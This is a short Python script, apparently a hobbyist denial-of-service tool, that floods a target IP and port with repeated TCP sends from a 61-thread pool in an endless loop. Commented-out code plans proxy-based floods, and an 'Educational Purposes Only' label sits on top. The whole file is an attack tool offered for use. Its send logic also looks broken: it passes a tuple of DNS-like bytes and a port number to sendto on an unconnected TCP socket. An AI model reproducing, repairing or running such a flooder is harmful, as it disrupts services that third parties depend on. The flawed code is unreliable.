import socket
import sys
from concurrent.futures import Future
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import as_completed

# Educational Purposes Only
# Z3NTL3
# TCP Layer 4 Flood for Ipv4's

count = 0
def Usage():
    print(f"""
python3 {__file__} ip port threads
""")

try:
    websiteHost_or_IP = sys.argv[1]
    portX = int(sys.argv[2])
except:
    Usage()
    sys.exit(-1)

# Will implement Proxied L4 DDOS Later
''' 
def Proxies(file = sys.argv[1]):
    if os.path.exists(file):
        with open(file,"r")as file:
            content = file.read().strip(" ").split("\n")
        return content
    else:
        print(f"File \'{file}\' does not exist")
        sys.exit(-1)

def FormatCheck():
    proxys = Proxies()
    err = False
    for prox in proxys:
        if ":" not in prox:
            err = True
            break
    if err:
        print("Please format your proxies like ip:port each line and remove all white spaces")
        sys.exit(-1)
'''
def Flooder(**pHu):
    global count
    py = (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',53)
    try:
        sVar = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sendByte = sVar.sendto(py, (pHu['host_ip'],pHu['port']))
        count+=1
        return f"SEND {count} TCP Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
    except:
        return f"TCP Flood Failed On {pHu['host_ip']}:{pHu['port']}"
    finally:
        sVar.close()
    
def Main():
    global count
    pool =  ThreadPoolExecutor(max_workers=61)
    while True:
        f = pool.submit(Flooder,host_ip=websiteHost_or_IP,port=portX)
        print(f.result())
        
if __name__ == "__main__":
    Main()
